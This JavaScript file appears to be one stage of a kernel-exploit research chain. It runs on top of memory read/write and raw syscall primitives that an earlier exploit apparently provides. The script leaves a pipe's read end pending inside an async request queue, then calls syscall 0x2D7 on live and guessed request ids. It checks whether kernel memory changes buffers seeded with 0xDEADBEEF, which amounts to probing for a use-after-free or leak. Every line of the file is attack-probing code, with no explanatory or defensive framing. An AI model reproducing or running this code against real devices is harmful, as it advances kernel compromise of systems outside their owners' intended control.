// 14_livefill.js — fill with LIVE pending-read fd (pipe read-end, empty => pending),
// then 727 immediately in the same run. No closes until the end.
(async () => {
    const LOG_HOST = "192.168.0.163";
    const say = (s) => { try { log("[f14] " + s); } catch (e) {} };
    const shout = (s) => { try { send_notification(s); } catch (e) {} };
    try { LOG_SERVER = "http://" + LOG_HOST + ":8080/log"; } catch (e) {}
    try { if (typeof checkLogServer === "function") await checkLogServer(); } catch (e) {}
    const pace = () => new Promise((r) => setTimeout(r, 500));
    const step = async (tag, fn) => {
        shout("f14: " + tag); say(tag); await pace();
        try { const r = await fn(); shout(("f14: " + tag + "=" + String(r)).slice(0,110)); say(tag + "=" + String(r)); await pace(); return r; }
        catch (e) { shout("f14: " + tag + " THREW"); say(tag + " threw"); await pace(); return null; }
    };
    await step("start", async () => "go");
    await step("init", async () => await syscall(0x29En, 0n,0n,0n,0n,0n,0n));
    let rfd = -1, wfd = -1;
    await step("pipe", async () => {
        const a = malloc(8); write64(a, 0n);
        const r = await syscall(0x2AFn, a, 0n,0n,0n,0n,0n);
        try {
            const fds = read64(a);
            rfd = Number(fds & 0xFFFFFFFFn); wfd = Number((fds >> 32n) & 0xFFFFFFFFn);
        } catch (e) {}
        return String(r) + " r=" + rfd + " w=" + wfd + " (LEFT OPEN)";
    });
    let id0 = 0, id1 = 0;
    await step("fill", async () => {
        const RB = 0x28;
        const reqs = malloc(RB * 2);
        for (let i = 0; i < RB * 2; i += 8) write64(reqs + BigInt(i), 0n);
        for (let i = 0; i < 2; i++) write32(reqs + BigInt(i * RB + 0x20), rfd);
        const ids = malloc(8);
        write32(ids, 0n); write32(ids + 4n, 0n);
        const r = await syscall(0x29Dn, 0x1001n, reqs, 2n, 3n, ids, 0n);
        try { id0 = Number(read32(ids)); id1 = Number(read32(ids + 4n)); } catch (e) {}
        return String(r) + " ids=" + id0 + "," + id1;
    });
    for (const id of [1n, 2n]) {
        await step("727/" + id, async () => {
            const ob = malloc(0x40);
            for (let i = 0n; i < 0x40n; i += 8n) write64(ob + i, 0xDEADBEEFn + i);
            const r = await syscall(0x2D7n, id, ob, 0n, 0n, 0n, 0n);
            let ch = [];
            try {
                for (let i = 0n; i < 0x40n; i += 8n) {
                    const v = read64(ob + i);
                    if (v !== (0xDEADBEEFn + i)) ch.push(i.toString() + "=" + v.toString(16));
                }
            } catch (e) { ch.push("READFAULT"); }
            return String(r) + " ch[" + ch.length + "]" + (ch.length ? " " + ch.slice(0,4).join(" ") : "");
        });
    }
    for (const id of [BigInt(id0), BigInt(id1)]) {
        if (!id) continue;
        await step("727live/" + id, async () => {
            const ob = malloc(0x40);
            for (let i = 0n; i < 0x40n; i += 8n) write64(ob + i, 0xDEADBEEFn + i);
            const r = await syscall(0x2D7n, id, ob, 0n, 0n, 0n, 0n);
            let ch = [];
            try {
                for (let i = 0n; i < 0x40n; i += 8n) {
                    const v = read64(ob + i);
                    if (v !== (0xDEADBEEFn + i)) ch.push(i.toString() + "=" + v.toString(16));
                }
            } catch (e) { ch.push("READFAULT"); }
            return String(r) + " ch[" + ch.length + "]" + (ch.length ? " " + ch.slice(0,4).join(" ") : "");
        });
    }
    await step("done", async () => "ok (fds left open deliberately)");
})()
